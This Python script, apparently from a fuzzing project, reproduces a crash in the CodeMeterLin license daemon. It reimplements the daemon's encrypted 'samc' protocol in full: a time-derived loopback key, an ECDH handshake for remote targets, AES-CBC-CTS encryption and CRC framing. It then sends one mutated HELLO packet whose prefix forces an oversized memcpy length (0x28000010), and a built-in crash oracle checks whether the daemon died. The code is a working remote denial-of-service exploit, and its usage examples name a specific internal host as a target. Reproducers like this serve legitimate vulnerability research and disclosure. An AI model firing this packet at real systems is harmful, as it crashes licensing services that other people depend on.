#!/usr/bin/env python3
"""Standalone single-packet reproducer for the prefixed-HELLO crash.

This file intentionally has no project-local imports and reads no captured
session data files. Its only non-stdlib Python dependency is `cryptography`.
The canonical HELLO plaintext is built from a zero-filled 184-byte message plus
the few observed fixed fields needed to match the captured testbench HELLO.

It sends one valid encrypted SAMC client-to-daemon frame whose decrypted
plaintext is:

    5e 35 5e d6 f2 || canonical HELLO with a fresh 4-byte client token

For non-loopback targets, it first completes the ECDH selector exchange and
sends the same application plaintext under selector 0xa1.

That shifted HELLO makes the parser see 0x28000010 at cleartext offset 0x0c,
which is the value observed as the later memcpy length at CodeMeterLin+0x8f431d.

Protocol layering, as used here:

    TCP/22350
      -> outer "samc" frame header
      -> selector byte/channel
         0xa0: loopback-only, time-derived PSK channel
         0xa2 0x05: cleartext ECDH init frame
         0xa1: ECDH-established encrypted channel
      -> AES-CBC-CTS ciphertext
      -> application plaintext, where this reproducer places:
         prefix || canonical HELLO || padding || data_len || crc32

The bug trigger is not in the ECDH or PSK machinery. Those layers only make the
daemon accept and decrypt the application plaintext. The reduced trigger is the
five-byte prefix before the canonical HELLO.
"""

from __future__ import annotations

import argparse
import hashlib
import os
from pathlib import Path
import socket
import struct
import time
import zlib

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


# This is the reduced mutation from the fuzzing run. It is prepended as raw
# application plaintext before any padding, CRC, AES, selector, or samc header
# is applied.
DEFAULT_PREFIX_HEX = "5e355ed6f2"

# Expected first 16 plaintext bytes after applying the default prefix to the
# canonical HELLO. This is a guardrail: if the generated standalone HELLO shape
# drifts, the reproducer should fail before sending a misleading packet.
DEFAULT_MUTATED_HELLO_HEAD_HEX = "5e355ed6f20a00000000000010000028"

# The shifted little-endian word at application offset 0x0c. Confirmed cores
# show this value later used as the memcpy length at CodeMeterLin+0x8f431d.
EXPECTED_BAD_LEN = 0x28000010

# The captured HELLO is sparse: a 184-byte plaintext with a four-byte fresh
# client token and a few fixed non-zero bytes. This standalone file reconstructs
# that shape directly instead of importing captured session data.
HELLO_LEN = 184
HELLO_TOKEN_OFFSET = 28
HELLO_TOKEN_LEN = 4

# Bytes 8..15 of the outer samc header after the length field. Existing traces
# show this constant tail as flags/version plus a zero reserved word:
#
#   "samc" | total_len_u32_le | 11 00 01 00 | 00 00 00 00
SAMC_HEADER_TAIL = bytes([0x11, 0, 1, 0, 0, 0, 0, 0])

# Non-token bytes observed in the canonical HELLO plaintext. Everything else in
# the 184-byte HELLO is zero. Avoid assigning protocol names where the binary
# analysis has not proven semantics.
HELLO_FIXED_BYTES = {
    0x00: 0x0A,  # HELLO opcode.
    0x07: 0x10,  # observed fixed field.
    0x0A: 0x28,  # observed fixed field; shifted by the prefix into bad length.
    0x22: 0x72,  # observed fixed field.
}


def magic_div_1009(eax: int) -> int:
    """Reproduce CodeMeter's integer bucket transform for the PSK channel.

    The loopback 0xa0 channel does not use ECDH. It derives AES material from
    the current time after this multiply/shift sequence. Keeping the transform
    byte-for-byte equivalent lets the daemon decrypt the frame as if a normal
    local client had sent it.
    """
    eax = (eax * 1000) & 0xFFFFFFFF
    rcx = ((eax * 0x3CE4585) >> 32) & 0xFFFFFFFF
    eax = (eax - rcx) & 0xFFFFFFFF
    eax >>= 1
    eax = (eax + rcx) & 0xFFFFFFFF
    return eax >> 9


def derive_session_key_iv(t: int) -> tuple[bytes, bytes]:
    """Derive the loopback PSK channel AES key and IV for wall-clock time t.

    This is used only for selector 0xa0. The IV deliberately overlaps the SHA-1
    digest with the key (`digest[4:20]`), matching the captured app-to-daemon
    channel.
    """
    digest = hashlib.sha1(struct.pack("<I", magic_div_1009(t))).digest()
    return digest[:16], digest[4:20]


def cts_shuffle(ciphertext: bytes) -> bytes:
    """Apply or undo CodeMeter's aligned CBC-CTS last-two-block shuffle.

    For aligned ciphertexts of at least two blocks, CodeMeter swaps the last
    two AES-CBC blocks on the wire. The operation is self-inverse, so the same
    helper is used before sending and after receiving.
    """
    if len(ciphertext) < 32:
        return ciphertext
    return ciphertext[:-32] + ciphertext[-16:] + ciphertext[-32:-16]


def build_mac_suffix(plaintext: bytes) -> bytes:
    """Build the loopback 0xa0 plaintext envelope before AES encryption.

    The PSK path's integrity tail is:

        application_plaintext || zero_pad || data_len_u32 || crc32(data)

    Here the CRC covers only the original application plaintext. The ECDH path
    below uses a slightly different rule where the CRC covers all bytes except
    the CRC itself.
    """
    aligned = ((len(plaintext) + 16) + 15) & ~15
    if aligned < 32:
        aligned = 32
    pad_len = aligned - len(plaintext) - 8
    return (
        plaintext
        + (b"\x00" * pad_len)
        + struct.pack("<I", len(plaintext))
        + struct.pack("<I", zlib.crc32(plaintext))
    )


def encrypt_c2d_frame(plaintext: bytes, t: int) -> bytes:
    """Build a complete loopback 0xa0 TCP payload.

    The returned bytes are ready for `sock.sendall`:

        "samc" header || selector 0xa0 || cts_shuffle(AES-CBC(full_plaintext))

    This path is accepted only from loopback peers on network-server builds.
    """
    full_plaintext = build_mac_suffix(plaintext)
    key, iv = derive_session_key_iv(t)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
    body = b"\xa0" + cts_shuffle(ciphertext)
    header = (
        b"samc"
        + struct.pack("<I", len(body))
        + bytes([0x11, 0, 1, 0, 0, 0, 0, 0])
    )
    return header + body


def is_loopback_target(host: str) -> bool:
    """Best-effort check used only to choose default channel/oracle behavior.

    This intentionally does not resolve DNS or enumerate interfaces. It is a
    conservative CLI default: explicit `--channel ecdh` or `--channel psk`
    always wins.
    """
    return host in {"127.0.0.1", "::1", "localhost"}


def resolve_channel(channel: str, host: str) -> str:
    """Resolve the user-facing channel option to the concrete selector path."""
    if channel != "auto":
        return channel
    return "psk" if is_loopback_target(host) else "ecdh"


def recv_exact(sock: socket.socket, n: int, timeout: float) -> bytes:
    """Read up to n bytes, returning partial data on timeout/close.

    Reproducers should not hang forever after a crash. Returning partial data
    lets callers decide whether the daemon closed early, timed out, or sent a
    malformed frame.
    """
    sock.settimeout(timeout)
    chunks = bytearray()
    while len(chunks) < n:
        try:
            chunk = sock.recv(n - len(chunks))
        except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
            break
        if not chunk:
            break
        chunks.extend(chunk)
    return bytes(chunks)


def send_samc_payload(sock: socket.socket, payload: bytes) -> None:
    """Send one outer samc envelope with the provided selector/cipher payload.

    `payload` starts at the selector layer:

        0xa2 0x05 + EC point     for ECDH init, or
        0xa1 + ciphertext        for ECDH encrypted application data

    The outer samc length is the number of bytes after the 16-byte header.
    """
    header = b"samc" + struct.pack("<I", len(payload)) + SAMC_HEADER_TAIL
    sock.sendall(header + payload)


def recv_samc_payload(sock: socket.socket, timeout: float) -> bytes | None:
    """Receive one samc frame and return only the selector/cipher payload."""
    hdr = recv_exact(sock, 16, timeout)
    if len(hdr) != 16 or hdr[:4] != b"samc":
        return None
    body_len = struct.unpack_from("<I", hdr, 4)[0]
    if body_len > 1 << 24:
        return None
    body = recv_exact(sock, body_len, timeout)
    if len(body) != body_len:
        return None
    return body


def derive_ecdh_key_iv(shared: bytes) -> tuple[bytes, bytes]:
    """Derive the ECDH channel AES key and IV from the P-224 shared secret."""
    digest = hashlib.sha256(shared + b"\x00\x00\x00\x01").digest()
    return digest[:16], digest[16:32]


def do_ecdh_handshake(sock: socket.socket, timeout: float) -> tuple[bytes, bytes, bytes]:
    """Run the remote-accepted ECDH selector exchange and return key/iv.

    Wire shape:

        C -> S: samc(len=59) || 0xa2 0x05 || uncompressed P-224 public point
        S -> C: samc(len=65) || 8-byte subheader || server P-224 public point

    The server's public point starts at response offset 8. Offset 8 must be the
    uncompressed-point marker 0x04; the next two 28-byte fields are X and Y.
    """
    private_key = ec.generate_private_key(ec.SECP224R1(), default_backend())
    public_numbers = private_key.public_key().public_numbers()

    # P-224 uncompressed point encoding is:
    #
    #   0x04 || X(28 bytes big-endian) || Y(28 bytes big-endian)
    client_point = (
        b"\x04"
        + public_numbers.x.to_bytes(28, "big")
        + public_numbers.y.to_bytes(28, "big")
    )

    # The ECDH init selector is the only cleartext selector payload used for
    # remote peers. It establishes the AES material used by later 0xa1 frames.
    send_samc_payload(sock, b"\xa2\x05" + client_point)
    response = recv_samc_payload(sock, timeout)
    if response is None:
        raise ConnectionError("no ECDH response")
    if len(response) < 65:
        raise ConnectionError(f"short ECDH response: {len(response)} bytes")
    if response[8] != 0x04:
        raise ConnectionError(f"unexpected ECDH point marker: 0x{response[8]:02x}")

    # Skip the 8-byte server subheader and parse the returned public point.
    server_x = int.from_bytes(response[9:37], "big")
    server_y = int.from_bytes(response[37:65], "big")
    server_public = ec.EllipticCurvePublicNumbers(
        server_x, server_y, ec.SECP224R1(),
    ).public_key(default_backend())
    shared = private_key.exchange(ec.ECDH(), server_public)
    key, iv = derive_ecdh_key_iv(shared)
    return key, iv, response


def build_ecdh_mac_suffix(plaintext: bytes) -> bytes:
    """Append the ECDH-channel padded length/CRC tail.

    ECDH plaintext frames still carry the same application bytes, but the
    integrity rule differs from the loopback PSK path:

        application_plaintext || zero_pad || data_len_u32 || crc32(all-but-crc)

    The CRC input is `plaintext + pad + data_len`. That matches the remote
    daemon-to-server channel observations and is what lets the remote parser
    accept the 0xa1 frame before it reaches the vulnerable application parser.
    """
    aligned = ((len(plaintext) + 16) + 15) & ~15
    if aligned < 32:
        aligned = 32
    pad_len = aligned - len(plaintext) - 8
    body = plaintext + (b"\x00" * pad_len) + struct.pack("<I", len(plaintext))
    return body + struct.pack("<I", zlib.crc32(body) & 0xFFFFFFFF)


def encrypt_ecdh_payload(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """Encrypt one ECDH-channel application frame.

    The returned payload starts at the selector byte (`0xa1`) and is not wrapped
    in the outer samc header yet. `send_samc_payload` adds that header.
    """
    full_plaintext = build_ecdh_mac_suffix(plaintext)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
    return b"\xa1" + cts_shuffle(ciphertext)


def decrypt_ecdh_response(payload: bytes | None, key: bytes, iv: bytes) -> bytes | None:
    """Best-effort decrypt of a server-to-client ECDH response.

    Server responses on this channel do not include the client-to-server 0xa1
    selector byte; the samc payload is just the CTS-shuffled ciphertext. This
    function is diagnostic only. A crash often means there is no response.
    """
    if payload is None or len(payload) < 16 or len(payload) % 16 != 0:
        return None
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    plaintext = decryptor.update(cts_shuffle(payload)) + decryptor.finalize()
    if len(plaintext) < 8:
        return None
    data_len = struct.unpack_from("<I", plaintext, len(plaintext) - 8)[0]
    crc = struct.unpack_from("<I", plaintext, len(plaintext) - 4)[0]
    if data_len > len(plaintext) - 8:
        return None
    if (zlib.crc32(plaintext[:-4]) & 0xFFFFFFFF) != crc:
        return None
    return plaintext[:data_len]


def validate_hello_shape(hello: bytes) -> None:
    """Assert that the built HELLO matches the captured shape modulo token.

    The standalone reproducer is useful only if it continues to create the same
    canonical HELLO that was reduced from captures. This validator catches
    accidental edits to fixed bytes, length, or token placement.
    """
    if len(hello) != HELLO_LEN:
        raise AssertionError(f"HELLO length is {len(hello)}, expected {HELLO_LEN}")
    token_end = HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN
    for offset, byte in enumerate(hello):
        if HELLO_TOKEN_OFFSET <= offset < token_end:
            continue
        expected = HELLO_FIXED_BYTES.get(offset, 0)
        if byte != expected:
            raise AssertionError(
                f"HELLO byte 0x{offset:x} is 0x{byte:02x}, expected 0x{expected:02x}"
            )


def build_canonical_hello(token: bytes) -> bytes:
    """Build the captured canonical HELLO shape with a fresh client token.

    CodeMeter rejects replayed HELLO tokens, so every run gets a new four-byte
    token even though the rest of the reconstructed HELLO is deterministic.
    """
    if len(token) != HELLO_TOKEN_LEN:
        raise ValueError(f"HELLO token must be {HELLO_TOKEN_LEN} bytes")
    hello = bytearray(HELLO_LEN)
    for offset, byte in HELLO_FIXED_BYTES.items():
        hello[offset] = byte
    hello[HELLO_TOKEN_OFFSET:HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN] = token
    built = bytes(hello)
    validate_hello_shape(built)
    return built


def fresh_hello() -> tuple[bytes, bytes]:
    """Return `(canonical_hello, token)` for one new reproduction attempt."""
    token = os.urandom(HELLO_TOKEN_LEN)
    return build_canonical_hello(token), token


def u32_words(data: bytes, count: int = 4) -> list[int]:
    """Decode early little-endian words for the human-readable crash summary."""
    words = []
    for offset in range(0, min(len(data), count * 4), 4):
        if offset + 4 <= len(data):
            words.append(struct.unpack_from("<I", data, offset)[0])
    return words


def validate_default_crash_layout(prefix: bytes, payload: bytes) -> None:
    """Assert the default prefix still creates the reduced crash layout.

    With the default prefix, the first 16 bytes should be:

        5e 35 5e d6 f2 0a 00 00 00 00 00 00 10 00 00 28

    Interpreted as little-endian u32 values, the fourth word is 0x28000010.
    That is the value this reproducer is designed to route into the memcpy
    length field.
    """
    if prefix != bytes.fromhex(DEFAULT_PREFIX_HEX):
        return
    expected_head = bytes.fromhex(DEFAULT_MUTATED_HELLO_HEAD_HEX)
    if payload[:len(expected_head)] != expected_head:
        raise AssertionError(
            f"mutated HELLO head is {payload[:len(expected_head)].hex()}, "
            f"expected {expected_head.hex()}"
        )
    bad_len = struct.unpack_from("<I", payload, 0x0C)[0]
    if bad_len != EXPECTED_BAD_LEN:
        raise AssertionError(f"bad length is 0x{bad_len:08x}, expected 0x{EXPECTED_BAD_LEN:08x}")


def codemeter_pid_from_proc() -> int | None:
    """Find the local CodeMeterLin PID without shelling out to pgrep."""
    for comm in sorted(Path("/proc").glob("[0-9]*/comm")):
        try:
            if comm.read_text(errors="replace").strip() == "CodeMeterLin":
                return int(comm.parent.name)
        except OSError:
            continue
    return None


def newest_core() -> tuple[str, int, int] | None:
    """Return the newest local CodeMeter core-like file, if one exists."""
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def send_one(host: str, port: int, wire: bytes, timeout: float) -> None:
    """Open one connection, send one prebuilt PSK frame, and close."""
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(wire)


def print_packet_summary(
    prefix: bytes,
    token: bytes,
    payload: bytes,
    *,
    channel: str,
    target: str,
    application_wire_len: int,
) -> None:
    """Print the invariant part of the reproduction before sending anything."""
    words = u32_words(payload, 4)
    print("=== packet ===")
    print(f"target={target}")
    print(f"channel={channel}")
    print(f"prefix_hex={prefix.hex()}")
    print(f"fresh_client_token={token.hex()}")
    print(f"canonical_hello_len={HELLO_LEN}")
    print(f"mutated_hello_len={len(payload)}")
    print(f"mutated_hello_head={payload[:16].hex()}")
    print("mutated_hello_first_u32_le=" + ",".join(f"0x{word:08x}" for word in words))
    if len(words) >= 4:
        print(f"word_at_cleartext_offset_0x0c=0x{words[3]:08x}")
        print(f"matches_expected_bad_len={words[3] == EXPECTED_BAD_LEN}")
    print(f"application_wire_len={application_wire_len}")
    print()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Standalone one-packet prefixed-HELLO CodeMeterLin reproducer.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 fuzzer/repro_prefixed_hello_standalone.py --dry-run
  python3 fuzzer/repro_prefixed_hello_standalone.py
  python3 fuzzer/repro_prefixed_hello_standalone.py --host 127.0.0.1 --port 22350
  python3 fuzzer/repro_prefixed_hello_standalone.py --host vistrrdslin0004.vi.vector.int
""",
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=22350)
    parser.add_argument("--channel", choices=["auto", "psk", "ecdh"], default="auto",
                        help="crypto channel: auto uses PSK for loopback, ECDH otherwise")
    parser.add_argument("--prefix", default=DEFAULT_PREFIX_HEX,
                        help="hex bytes to prepend before the canonical HELLO")
    parser.add_argument("--connect-timeout", type=float, default=2.0)
    parser.add_argument("--socket-timeout", type=float, default=2.0)
    parser.add_argument("--wait", type=float, default=10.0,
                        help="seconds to wait for PID/core crash evidence after send")
    parser.add_argument("--dry-run", action="store_true",
                        help="construct and print the packet summary, but do not send")
    parser.add_argument("--no-crash-oracle", action="store_true",
                        help="do not inspect /proc or coredump directories")
    args = parser.parse_args()

    # `auto` keeps the historical local behavior intact while making the same
    # command usable against a network-server daemon. Users can still force a
    # channel explicitly when testing edge cases.
    channel = resolve_channel(args.channel, args.host)

    # The prefix is the only mutation under test. Everything else in this file
    # exists to make the daemon accept and decrypt this mutated plaintext.
    prefix = bytes.fromhex(args.prefix)
    if not prefix:
        raise SystemExit("--prefix must not be empty")

    # Build the application plaintext first. This is the vulnerable parser's
    # input after the daemon removes samc, selector, AES, padding, and CRC.
    hello, token = fresh_hello()
    payload = prefix + hello
    validate_default_crash_layout(prefix, payload)

    # For dry-run output, report the length of the final application frame that
    # will carry the mutated HELLO. ECDH mode cannot build the ciphertext until
    # after the live ECDH handshake yields key/iv, so it computes the expected
    # length from the padded plaintext instead.
    if channel == "psk":
        wire = encrypt_c2d_frame(payload, int(time.time()))
        application_wire_len = len(wire)
    elif channel == "ecdh":
        wire = None
        application_wire_len = 16 + 1 + len(build_ecdh_mac_suffix(payload))
    else:
        raise AssertionError(f"unexpected channel: {channel}")

    print_packet_summary(
        prefix,
        token,
        payload,
        channel=channel,
        target=f"{args.host}:{args.port}",
        application_wire_len=application_wire_len,
    )

    if args.dry_run:
        print("dry_run=True")
        return 0

    # The built-in crash oracle is intentionally local-only. For remote hosts,
    # use SSH/core monitoring or another out-of-band oracle on the target.
    local_crash_oracle = not args.no_crash_oracle and is_loopback_target(args.host)
    before_pid = codemeter_pid_from_proc() if local_crash_oracle else None
    before_core = newest_core() if local_crash_oracle else None

    print("=== baseline ===")
    print(f"local_crash_oracle={local_crash_oracle}")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()

    print("=== send ===")
    print(f"target={args.host}:{args.port}")
    if channel == "psk":
        # Loopback path: the whole samc frame can be constructed before the TCP
        # connection because the key is derived from local wall-clock time.
        if wire is None:
            raise AssertionError("missing PSK wire frame")
        print("selector=0xa0")
        send_one(args.host, args.port, wire, args.connect_timeout)
    elif channel == "ecdh":
        # Remote path: open one TCP connection, perform ECDH, then send the
        # same application plaintext as an encrypted selector-0xa1 frame on
        # that established channel.
        print("selector=0xa1")
        with socket.create_connection((args.host, args.port), timeout=args.connect_timeout) as sock:
            sock.settimeout(args.socket_timeout)
            key, iv, ecdh_response = do_ecdh_handshake(sock, args.socket_timeout)
            ecdh_payload = encrypt_ecdh_payload(payload, key, iv)
            print(f"server_point={ecdh_response[8:65].hex()}")
            print(f"key={key.hex()}")
            print(f"iv={iv.hex()}")
            print(f"encrypted_payload_len={len(ecdh_payload)}")
            send_samc_payload(sock, ecdh_payload)
            response_payload = recv_samc_payload(sock, args.socket_timeout)
            response_inner = decrypt_ecdh_response(response_payload, key, iv)
            print(f"response_payload_len={None if response_payload is None else len(response_payload)}")
            print(f"response_inner_len={None if response_inner is None else len(response_inner)}")
            if response_inner is not None:
                print(f"response_inner_head={response_inner[:64].hex()}")
    else:
        raise AssertionError(f"unexpected channel: {channel}")
    print("sent=True")

    if not local_crash_oracle:
        print()
        print("=== crash oracle ===")
        print("local_crash_oracle=False")
        print("No local PID/core check was run for this target.")
        return 0

    # Local success means either the daemon PID changed/disappeared or a new
    # core-like file appeared after sending the frame.
    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid_from_proc()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid_from_proc()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print()
    print("=== crash oracle ===")
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
